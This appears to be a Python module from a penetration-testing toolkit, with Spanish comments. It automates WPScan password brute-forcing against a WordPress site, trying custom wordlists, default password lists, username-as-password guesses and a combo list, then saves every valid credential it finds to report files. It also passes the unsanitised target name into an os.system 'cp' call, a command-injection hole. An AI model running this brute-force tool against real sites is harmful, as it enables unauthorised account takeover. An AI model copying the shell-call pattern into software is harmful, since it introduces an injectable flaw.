import os
import sys
import subprocess
import tempfile
import re

def run_wpscan_attack_file(target, usernames_file, passwords_file, success_file):
    """
    Ejecuta WPScan utilizando archivos de usuarios y contraseñas y reporta todas las credenciales
    válidas encontradas (según la salida, que debe contener líneas con el formato:
    [SUCCESS] - usuario / contraseña).
    """
    command = [
        "wpscan",
        "--url", target,
        "--usernames", usernames_file,
        "--passwords", passwords_file,
        "--no-banner",
        "--update"
    ]
    print(f"[*] Ejecutando WPScan: {' '.join(command)}")
    result = subprocess.run(command, capture_output=True, text=True)
    output = result.stdout + "\n" + result.stderr

    if "Scan Aborted" in output and "redirects to" in output:
        print("[*] Analizando la salida para extraer la nueva URL...")
        match = re.search(r"redirects to:?\s*(\S+)", output, re.IGNORECASE)
        if match:
            new_url = match.group(1).rstrip('/.')
            print(f"[*] Nueva URL detectada: {new_url}. Reejecutando WPScan en la nueva URL...")
            return run_wpscan_attack_file(new_url, usernames_file, passwords_file, success_file)
        else:
            print("[!] No se pudo extraer la nueva URL para reejecutar WPScan.")
            return 0

    # Buscar todas las ocurrencias de éxito en el formato: [SUCCESS] - usuario / contraseña
    success_matches = re.findall(r'\[SUCCESS\]\s*-\s*(\S+)\s*/\s*(\S+)', output)
    if success_matches:
        for username, password in success_matches:
            print(f"[+] Credenciales válidas encontradas: {username}:{password}")
            with open(success_file, "a", encoding="utf-8") as sf:
                sf.write(f"Credenciales válidas encontradas en Wordpress: {username}:{password}\n")
        return len(success_matches)
    else:
        print("[-] WPScan: No se encontraron credenciales válidas en este intento.")
        return 0

def wordpress_bruteforce(target):
    """
    Realiza fuerza bruta contra un sitio WordPress usando WPScan y las wordlists disponibles.
    Se ejecutan todas las casuísticas:
      1. Si existe la carpeta wordlists/<target_clean>/:
         - Si se encuentran ambos archivos (users.txt y passwords.txt), se usan esos.
         - Si solo existe users.txt, se utiliza la lista por defecto de contraseñas (top_wordpress_passwords.txt).
         Además, se prueba el escenario usuario:usuario para cada usuario.
      2. Se prueba la lista combinada de credenciales desde wordlists/misc/common_credentials.txt.
    Se reportan todas las credenciales válidas encontradas.
    """
    # Asegurarse de que el target incluya el esquema
    if not target.startswith("http://") and not target.startswith("https://"):
        target = "http://" + target
    target_clean = target.replace("http://", "").replace("https://", "").rstrip("/")

    # Directorio para guardar logs y resultados
    output_dir = os.path.join("logs", target_clean, "http", "wordpress")
    os.makedirs(output_dir, exist_ok=True)
    success_file = os.path.join(output_dir, "credentials.txt")
    # Se limpia el archivo de éxitos previo (si existe)
    with open(success_file, "w", encoding="utf-8") as sf:
        sf.write("")

    total_found = 0

    # --- 1. Intentar con listas personalizadas ---
    custom_dir = os.path.join("wordlists", target_clean)
    users_custom = []
    pass_custom = []
    user_file = os.path.join(custom_dir, "users.txt")
    pass_file = os.path.join(custom_dir, "passwords.txt")
    if os.path.isdir(custom_dir):
        if os.path.isfile(user_file):
            try:
                with open(user_file, "r", encoding="utf-8") as f:
                    users_custom = [line.strip() for line in f if line.strip()]
                print(f"[*] Se cargaron {len(users_custom)} usuarios personalizados desde {user_file}")
            except Exception as e:
                print(f"[!] Error al leer {user_file}: {e}")
        if os.path.isfile(pass_file):
            try:
                with open(pass_file, "r", encoding="utf-8") as f:
                    pass_custom = [line.strip() for line in f if line.strip()]
                print(f"[*] Se cargaron {len(pass_custom)} contraseñas personalizadas desde {pass_file}")
            except Exception as e:
                print(f"[!] Error al leer {pass_file}: {e}")

    if users_custom or pass_custom:
        print("[*] Intentando combinaciones personalizadas...")
        # Caso 1: Si existen ambos archivos personalizados
        if users_custom and pass_custom:
            total_found += run_wpscan_attack_file(target, user_file, pass_file, success_file)
        # Caso 2: Si solo existen usuarios personalizados (se usa la lista por defecto de contraseñas)
        if users_custom:
            default_pass_file = os.path.join("wordlists", "misc", "top_wordpress_passwords.txt")
            if os.path.isfile(default_pass_file):
                try:
                    with open(default_pass_file, "r", encoding="utf-8") as f:
                        default_passwords = [line.strip() for line in f if line.strip()]
                    print(f"[*] Se cargaron {len(default_passwords)} contraseñas por defecto desde {default_pass_file}")
                except Exception as e:
                    print(f"[!] Error al leer {default_pass_file}: {e}")
                    default_passwords = []
            else:
                print(f"[!] No se encontró la lista por defecto {default_pass_file}")
                default_passwords = []
            if default_passwords:
                total_found += run_wpscan_attack_file(target, user_file, default_pass_file, success_file)
        # Bloque adicional: Probar usuario:usuario
            total_found += run_wpscan_attack_file(target, user_file, user_file, success_file)

    # --- 2. Intentar con lista combinada por defecto ---
    default_combo_file = os.path.join("wordlists", "misc", "common_credentials.txt")
    if os.path.isfile(default_combo_file):
        try:
            with open(default_combo_file, "r", encoding="utf-8") as f:
                combos = [line.strip() for line in f if line.strip()]
            print(f"[*] Se cargaron {len(combos)} combos desde {default_combo_file}")
        except Exception as e:
            print(f"[!] Error al leer {default_combo_file}: {e}")
            combos = []
        if combos:
            # Crear listas para usuarios y contraseñas a partir de los combos
            usuarios = []
            contrasenas = []
            for combo in combos:
                if ":" in combo:
                    u, p = combo.split(":", 1)
                    usuarios.append(u.strip())
                    contrasenas.append(p.strip())

            with tempfile.NamedTemporaryFile(mode="w", delete=False, encoding="utf-8") as tmp_users:
                for user in usuarios:
                    tmp_users.write(user + "\n")
                tmp_users_file = tmp_users.name

            with tempfile.NamedTemporaryFile(mode="w", delete=False, encoding="utf-8") as tmp_pass:
                for pwd in contrasenas:
                    tmp_pass.write(pwd + "\n")
                tmp_pass_file = tmp_pass.name

            print("[*] Probando combinaciones desde lista combinada utilizando archivos temporales...")
            total_found += run_wpscan_attack_file(target, tmp_users_file, tmp_pass_file, success_file)

            # Eliminar los archivos temporales
            os.remove(tmp_users_file)
            os.remove(tmp_pass_file)
        else:
            print("[!] La lista combinada está vacía.")
    else:
        print(f"[!] No se encontró la lista combinada de credenciales: {default_combo_file}")

    if total_found > 0:
        print(f"[+] Bruteforce finalizado. Se encontraron un total de {total_found} credencial(es) válida(s).")
        # Copiar el archivo de éxitos a la carpeta de logs/<target>/reporte/wordpress_credentials.txt
        reporte_dir = os.path.join("logs", target_clean, "reporte")
        os.makedirs(reporte_dir, exist_ok=True)
        reporte_file = os.path.join(reporte_dir, "wordpress_credentials.txt")
        os.system(f"cp {success_file} {reporte_file}")
    else:
        print("[-] Bruteforce finalizado sin encontrar credenciales válidas.")
        with open(success_file, "w", encoding="utf-8") as sf:
            sf.write("No se encontraron credenciales válidas en Wordpress.")

def run_http_wordpress_bruteforce(target):
    wordpress_bruteforce(target)

if __name__ == "__main__":
    target = sys.argv[1]
    run_http_wordpress_bruteforce(target)
